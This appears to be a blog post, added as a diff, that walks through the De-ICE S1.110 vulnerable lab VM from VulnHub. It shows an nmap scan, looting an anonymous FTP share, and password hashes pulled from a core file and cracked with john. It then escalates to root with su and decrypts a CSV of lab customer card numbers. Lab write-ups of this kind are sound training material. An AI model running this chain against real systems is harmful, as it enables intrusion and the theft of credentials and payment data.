@@ -1,0 +1,133 @@
+---
+layout: post
+title: "DE-ICE-S1.110"
+date: 2015-05-10 00:01:04 +0200
+comments: true
+categories: [vulnhub, deice]
+---
+Image: [De-ICE: S1.110](https://www.vulnhub.com/entry/de-ice-s1110,9/)
+
+Nmap output:
+{% codeblock %}
+21/tcp  open     ftp     vsftpd 2.0.4
+22/tcp  filtered ssh 
+80/tcp  open     http    Apache httpd 2.2.4 ((Unix) mod_ssl/2.2.4 OpenSSL/0.9.8b DAV/2)
+631/tcp open     ipp     CUPS 1.1 
+{% endcodeblock %}
+
+FTP anonymous login is allowed:
+{% codeblock %}
+wget -r ftp://ftp@192.168.1.110:
+{% endcodeblock %}
+
+We have found a few files, but nothing particularly interesting:
+{% codeblock %}
+root@kali:~/DE-ICE-S1.110/192.168.1.110/download# cat ./opt/cygwin/etc/passwd
+SYSTEM:*:18:544:,S-1-5-18::
+Administrators:*:544:544:,S-1-5-32-544::
+Administrator:unused_by_nt/2000/xp:500:513:U-Tom-PC\Administrator,S-1-5-21-1894367954-3740816113-1455894701-500:/home/Administrator:/bin/bash
+Guest:unused_by_nt/2000/xp:501:513:U-Tom-PC\Guest,S-1-5-21-1894367954-3740816113-1455894701-501:/home/Guest:/bin/bash
+Tom:unused_by_nt/2000/xp:1000:513:U-Tom-PC\Tom,S-1-5-21-1894367954-3740816113-1455894701-1000:/home/Tom:/bin/bash
+__vmware_user__:unused_by_nt/2000/xp:1002:513:__vmware_user__,U-Tom-PC\__vmware_user__,S-1-5-21-1894367954-3740816113-1455894701-1002:/home/__vmware_user__:/bin/bash
+
+root@kali:~/DE-ICE-S1.110# cat 192.168.1.110/download/etc/shadow
+root:$1$3OF/pWTC$lvhdyl86pAEQcrvepWqpu.:12859:0:::::
+bin:*:9797:0:::::
+daemon:*:9797:0:::::
+adm:*:9797:0:::::
+lp:*:9797:0:::::
+sync:*:9797:0:::::
+shutdown:*:9797:0:::::
+halt:*:9797:0:::::
+mail:*:9797:0:::::
+news:*:9797:0:::::
+uucp:*:9797:0:::::
+operator:*:9797:0:::::
+games:*:9797:0:::::
+ftp:*:9797:0:::::
+smmsp:*:9797:0:::::
+mysql:*:9797:0:::::
+rpc:*:9797:0:::::
+sshd:*:9797:0:::::
+gdm:*:9797:0:::::
+pop:*:9797:0:::::
+nobody:*:9797:0:::::
+
+toor             (root)
+{% endcodeblock %}
+
+More about cygwin format [here](https://cygwin.com/cygwin-ug-net/ntsec.html).
+
+In /etc directory, there is a core file which contains password hashes:
+{% codeblock %}
+root@kali:~/DE-ICE-S1.110/192.168.1.110/download/etc# strings core | tail -1
+root:$1$aQo/FOTu$rriwTq.pGmN3OhFe75yd30:13574:0:::::bin:*:9797:0:::::daemon:*:9797:0:::::adm:*:9797:0:::::lp:*:9797:0:::::sync:*:9797:0:::::shutdown:*:9797:0:::::halt:*:9797:0:::::mail:*:9797:0:::::news:*:9797:0:::::uucp:*:9797:0:::::operator:*:9797:0:::::games:*:9797:0:::::ftp:*:9797:0:::::smmsp:*:9797:0:::::mysql:*:9797:0:::::rpc:*:9797:0:::::sshd:*:9797:0:::::gdm:*:9797:0:::::pop:*:9797:0:::::nobody:*:9797:0:::::aadams:$1$klZ09iws$fQDiqXfQXBErilgdRyogn.:13570:0:99999:7:::bbanter:$1$1wY0b2Bt$Q6cLev2TG9eH9iIaTuFKy1:13571:0:99999:7:::ccoffee:$1$6yf/SuEu$EZ1TWxFMHE0pDXCCMQu70/:13574:0:99999:7:::
+{% endcodeblock %}
+
+After adjusting:
+{% codeblock %}
+root:$1$aQo/FOTu$rriwTq.pGmN3OhFe75yd30:13574:0:::::
+bin:*:9797:0:::::
+daemon:*:9797:0:::::
+adm:*:9797:0:::::
+lp:*:9797:0:::::
+sync:*:9797:0:::::
+shutdown:*:9797:0:::::
+halt:*:9797:0:::::
+mail:*:9797:0:::::
+news:*:9797:0:::::
+uucp:*:9797:0:::::
+operator:*:9797:0:::::
+games:*:9797:0:::::
+ftp:*:9797:0:::::
+smmsp:*:9797:0:::::
+mysql:*:9797:0:::::
+rpc:*:9797:0:::::
+sshd:*:9797:0:::::
+gdm:*:9797:0:::::
+pop:*:9797:0:::::
+nobody:*:9797:0:::::
+aadams:$1$klZ09iws$fQDiqXfQXBErilgdRyogn.:13570:0:99999:7:::
+bbanter:$1$1wY0b2Bt$Q6cLev2TG9eH9iIaTuFKy1:13571:0:99999:7:::
+ccoffee:$1$6yf/SuEu$EZ1TWxFMHE0pDXCCMQu70/:13574:0:99999:7:::
+{% endcodeblock %}
+
+{% codeblock %}
+$ john ~/DE-ICE-S1.110/crackme.john --wordlist="/root/darkc0de.lst"
+Complexity       (root)
+Zymurgy          (bbanter)
+{% endcodeblock %}
+
+We log in as user bbanter and obtain root permissions:
+{% codeblock %}
+bbanter@slax:/$ su root
+Password: **********
+root@slax:/# id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy)
+{% endcodeblock %}
+
+Lastly, we check the backup file and decrypt CSV:
+{% codeblock lang:bash %}
+root@slax:/home/root/.save# cat copy.sh
+#!/bin/sh
+#encrypt files in ftp/incoming
+openssl enc -aes-256-cbc -salt -in /home/ftp/incoming/$1 -out /home/root/.save/$1.enc -pass file:/etc/ssl/certs/pw
+#remove old file
+rm /home/ftp/incoming/$1
+{% endcodeblock %}
+
+{% codeblock %}
+root@slax:/home/root/.save# cat /etc/ssl/certs/pw
+d2Ews4TgaQm72C0nr5t5U9noRfdllV62speWeC410il1lfd3Cxe2RqSx5o0Of
+{% endcodeblock %}
+
+{% codeblock %}
+root@slax:/home/root/.save# openssl enc -aes-256-cbc -d -in customer_account.csv.enc -pass file:/etc/ssl/certs/pw
+"CustomerID","CustomerName","CCType","AccountNo","ExpDate","DelMethod"
+1002,"Mozart Exercise Balls Corp.","VISA","2412225132153211","11/09","SHIP"
+1003,"Brahms 4-Hands Pianos","MC","3513151542522415","07/08","SHIP"
+1004,"Strauss Blue River Drinks","MC","2514351522413214","02/08","PICKUP"
+1005,"Beethoven Hearing-Aid Corp.","VISA","5126391235199246","09/09","SHIP"
+1006,"Mendelssohn Wedding Dresses","MC","6147032541326464","01/10","PICKUP"
+1007,"Tchaikovsky Nut Importer and Supplies","VISA","4123214145321524","05/08","SHIP"
+{% endcodeblock %}
